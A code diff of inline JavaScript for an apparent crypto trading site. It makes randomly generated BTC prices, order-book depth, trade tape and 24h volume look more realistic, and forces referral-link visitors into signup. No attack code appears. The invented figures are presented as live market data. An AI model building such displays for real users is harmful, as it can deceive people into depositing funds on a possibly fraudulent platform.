 function pop(t,m){document.getElementById("pop-spin").classList.add("hidden");document.getElementById("pop-title").textContent=t;document.getElementById("pop-msg").textContent=m||"";document.getElementById("pop-ok").classList.remove("hidden");document.getElementById("popup").classList.remove("hidden");}
 function popSpin(){document.getElementById("pop-spin").classList.remove("hidden");document.getElementById("pop-title").textContent="";document.getElementById("pop-msg").textContent="";document.getElementById("pop-ok").classList.add("hidden");document.getElementById("popup").classList.remove("hidden");setTimeout(closePop,1600);}
 function closePop(){document.getElementById("popup").classList.add("hidden");}
-function seedCandles(){candles=[];let p=67200;for(let i=0;i<36;i++){const o=p,c=o+(Math.random()-0.46)*90;candles.push({o:o,h:Math.max(o,c)+Math.random()*35,l:Math.min(o,c)-Math.random()*35,c:c});p=c;}px=candles[candles.length-1].c;}
-function drawOHLC(el){if(!el||!candles.length)return;el.innerHTML="";const hi=Math.max.apply(null,candles.map(function(k){return k.h;}));const lo=Math.min.apply(null,candles.map(function(k){return k.l;}));const span=hi-lo||1;candles.forEach(function(k){const col=document.createElement("div");col.className="candle-col";const color=k.c>=k.o?"#3ddc84":"#ff5d6c";const topPad=((hi-k.h)/span)*100,wickH=((k.h-k.l)/span)*100,bodyTop=((k.h-Math.max(k.o,k.c))/span)*100,bodyH=Math.max(2,(Math.abs(k.c-k.o)/span)*100);col.innerHTML='<div style="height:'+topPad+'%"></div><div class="wick" style="height:'+wickH+'%;background:'+color+'"></div>';const wrap=document.createElement("div");wrap.style.cssText="width:100%;display:flex;justify-content:center;margin-top:-"+wickH+"%;height:"+wickH+"%;position:relative;";const body=document.createElement("div");body.className="body";body.style.cssText="position:absolute;top:"+(bodyTop/wickH*100)+"%;height:"+Math.max(8,bodyH/wickH*100)+"%;background:"+color;wrap.appendChild(body);col.appendChild(wrap);el.appendChild(col);});}
+function seedCandles(){candles=[];let p=67880;for(let i=0;i<48;i++){const o=p;const drift=(Math.random()-0.48)*28+(Math.random()>0.93?(Math.random()-0.5)*80:0);const c=Math.max(65000,Math.min(71000,o+drift));const h=Math.max(o,c)+Math.random()*18;const l=Math.min(o,c)-Math.random()*18;candles.push({o:o,h:h,l:l,c:c});p=c;}px=candles[candles.length-1].c;}
+function drawOHLC(el){if(!el||!candles.length)return;el.innerHTML="";const hi=Math.max.apply(null,candles.map(function(k){return k.h;}));const lo=Math.min.apply(null,candles.map(function(k){return k.l;}));const span=hi-lo||1;candles.forEach(function(k){const col=document.createElement("div");col.className="candle-col";const color=k.c>=k.o?"#3ddc84":"#ff5d6c";const topPad=((hi-k.h)/span)*100,wickH=((k.h-k.l)/span)*100,bodyTop=((k.h-Math.max(k.o,k.c))/span)*100,bodyH=Math.max(1.5,(Math.abs(k.c-k.o)/span)*100);col.innerHTML='<div style="height:'+topPad+'%"></div><div class="wick" style="height:'+wickH+'%;background:'+color+'"></div>';const wrap=document.createElement("div");wrap.style.cssText="width:100%;display:flex;justify-content:center;margin-top:-"+wickH+"%;height:"+wickH+"%;position:relative;";const body=document.createElement("div");body.className="body";body.style.cssText="position:absolute;top:"+(bodyTop/wickH*100)+"%;height:"+Math.max(6,bodyH/wickH*100)+"%;background:"+color;wrap.appendChild(body);col.appendChild(wrap);el.appendChild(col);});}
 function fmt(n){return Number(n).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2});}
-function tickBook(){const a=document.getElementById("asks"),b=document.getElementById("bids");if(!a)return;let A="",B="";for(let i=5;i>=1;i--)A+='<div class="ob-row" style="color:#ff5d6c"><span>'+fmt(px+i)+'</span><span>0.12</span></div>';for(let i=1;i<=5;i++)B+='<div class="ob-row" style="color:#3ddc84"><span>'+fmt(px-i)+'</span><span>0.12</span></div>';a.innerHTML=A;b.innerHTML=B;}
-function tickTape(){const side=Math.random()>0.5?"BUY":"SELL";tape.unshift({side:side,px:px.toFixed(2)});if(tape.length>6)tape.pop();const el=document.getElementById("tape");if(el)el.innerHTML=tape.map(function(r){return '<div class="tape-row"><span style="color:'+(r.side==="BUY"?"#3ddc84":"#ff5d6c")+'">'+r.side+'</span><span>'+r.px+'</span></div>';}).join("");}
-function tickMarket(){if(!candles.length)seedCandles();const last=candles[candles.length-1];const c=Math.max(64000,Math.min(72000,last.c+(Math.random()-0.49)*18));last.c=c;last.h=Math.max(last.h,c);last.l=Math.min(last.l,c);if(Math.random()>0.7){candles.push({o:c,h:c+4,l:c-4,c:c});if(candles.length>36)candles.shift();}px=c;const pt=fmt(px);
-const hero=document.getElementById("hero-btc");if(hero)hero.textContent="$"+pt;
-const tp=document.getElementById("trade-price");if(tp)tp.textContent=pt;
-const mk=document.getElementById("mark-px");if(mk)mk.textContent=fmt(px-0.8);
+function tickBook(){const a=document.getElementById("asks"),b=document.getElementById("bids");if(!a)return;let A="",B="";for(let i=8;i>=1;i--){const p=px+i*0.42+Math.random()*0.12;const sz=(Math.random()*0.85+0.02).toFixed(4);A+='<div class="ob-row" style="color:#ff5d6c"><span>'+fmt(p)+'</span><span>'+sz+'</span></div>';}
+for(let i=1;i<=8;i++){const p=px-i*0.41-Math.random()*0.12;const sz=(Math.random()*0.85+0.02).toFixed(4);B+='<div class="ob-row" style="color:#3ddc84"><span>'+fmt(p)+'</span><span>'+sz+'</span></div>';}
+a.innerHTML=A;b.innerHTML=B;const sp=document.getElementById("spread");if(sp)sp.textContent="spread "+(0.38+Math.random()*0.25).toFixed(2);}
+function tickTape(){const side=Math.random()>0.47?"BUY":"SELL";const t=new Date().toTimeString().slice(0,8);tape.unshift({side:side,px:px.toFixed(2),sz:(Math.random()*0.31+0.01).toFixed(4),t:t});if(tape.length>9)tape.pop();
+const el=document.getElementById("tape");if(el)el.innerHTML=tape.map(function(r){return '<div class="tape-row"><span style="color:'+(r.side==="BUY"?"#3ddc84":"#ff5d6c")+'">'+r.side+'</span><span>'+r.px+'</span><span>'+r.sz+'</span><span class="text-amber-100/40">'+r.t+'</span></div>';}).join("");}
+function tickMarket(){
+if(!candles.length)seedCandles();
+const last=candles[candles.length-1];
+const step=(Math.random()-0.5)*6+(Math.random()>0.96?(Math.random()-0.5)*35:0);
+const c=Math.max(65200,Math.min(70800,last.c+step));
+last.c=c;last.h=Math.max(last.h,c+Math.random()*4);last.l=Math.min(last.l,c-Math.random()*4);
+if(Math.random()>0.62){candles.push({o:c,h:c+Math.random()*7,l:c-Math.random()*7,c:c});if(candles.length>48)candles.shift();}
+px=c;volBase+= (Math.random()-0.45)*0.8;
+const up=px>=openPx,pt=fmt(px),chg=((px-openPx)/openPx*100);
+const hero=document.getElementById("hero-btc");if(hero){hero.textContent=pt;hero.className=(up?"tick-up":"tick-down")+" font-mono";}
+const hp=document.getElementById("home-px");if(hp){hp.textContent=pt;hp.className=(up?"tick-up":"tick-down")+" font-mono";}
+const hc=document.getElementById("home-chg");if(hc){hc.textContent=(up?"+":"")+chg.toFixed(2)+"%";hc.className=up?"tick-up":"tick-down";}
+const hv=document.getElementById("home-vol");if(hv)hv.textContent=volBase.toFixed(2);
+const tp=document.getElementById("trade-price");if(tp){tp.textContent=pt;tp.className=(up?"tick-up":"tick-down")+" font-semibold text-2xl font-mono";}
+const mk=document.getElementById("mark-px");if(mk)mk.textContent=fmt(px-0.31);
 const ls=document.getElementById("last-px");if(ls)ls.textContent=pt;
-drawOHLC(document.getElementById("hero-chart"));drawOHLC(document.getElementById("dash-chart"));drawOHLC(document.getElementById("trade-chart"));tickBook();if(Math.random()>0.4)tickTape();
+const ch=document.getElementById("chg");if(ch){ch.textContent=(up?"+":"")+chg.toFixed(2)+"%";ch.className=up?"tick-up":"tick-down";}
+const vol=document.getElementById("vol24");if(vol)vol.textContent=volBase.toFixed(2)+" BTC";
+drawOHLC(document.getElementById("hero-chart"));drawOHLC(document.getElementById("dash-chart"));drawOHLC(document.getElementById("trade-chart"));tickBook();if(Math.random()>0.25)tickTape();
 }
 window.addEventListener("load",function(){
-const q=new URLSearchParams(location.search).get("ref");if(q){const box=document.getElementById("su-ref");if(box)box.value=q;}
-seedCandles();tickMarket();setInterval(tickMarket,900);
+const q=new URLSearchParams(location.search).get("ref");
+if(q){const box=document.getElementById("su-ref");if(box){box.value=q;box.readOnly=true;}showScreen("signup");}
+seedCandles();tickMarket();setInterval(tickMarket,700);
 const s=sess();
 if(s&&s.admin){document.getElementById("auth-wrap").classList.add("hidden");document.getElementById("admin-wrap").classList.remove("hidden");renderAdmin();}
 else if(s&&currentUser())enterDash();
 else if(location.hash==="#admin")showScreen("adminlogin");
-else showScreen("landing");
+else if(!q)showScreen("landing");
 });
 window.addEventListener("hashchange",function(){if(location.hash==="#admin"){document.getElementById("dash-wrap").classList.add("hidden");document.getElementById("admin-wrap").classList.add("hidden");document.getElementById("auth-wrap").classList.remove("hidden");showScreen("adminlogin");}});
 </script>
